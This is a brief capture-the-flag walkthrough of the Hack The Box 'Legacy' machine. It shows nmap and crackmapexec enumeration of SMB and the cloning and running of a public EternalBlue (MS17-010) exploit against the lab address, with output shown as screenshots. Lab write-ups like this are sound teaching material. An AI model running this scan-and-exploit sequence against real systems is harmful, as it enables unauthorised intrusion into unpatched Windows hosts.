---
layout: single
title: Legacy - Hack The Box
excerpt: "Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access."
date: 2025-05-27
classes: wide
header:
  teaser: /img2/legacy.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - SMB Enumeration
  - Eternalblue Exploitation (MS17-010)
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.4
```

![](/img2/Pasted%20image%2020250527092923.png)

- Vulnerability and version scan

```bash
nmap -sCV -p135,139,445 -vvv 10.10.10.4
```

![](/img2/Pasted%20image%2020250527093055.png)

- Try to connect smb with crackmapexec

```bash
crackmapexec smb 10.10.10.4 -u guest -p ''
```

![](/img2/Pasted%20image%2020250527101101.png)

> Probably will be vulnerable to EthernalBlue


- Vulnerability Scan

```bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.4
```

![](/img2/Pasted%20image%2020250527101301.png)

## Exploitation

- Ethernal Blue MS17-010 (CVE-2017-0143)

```bash
git clone https://github.com/n3rdh4x0r/MS17-010.git
cd MS17-010
python3 exploit.py 10.10.10.4
```

![](/img2/Pasted%20image%2020250527101438.png)

![[Pasted image 20250527100911.png]]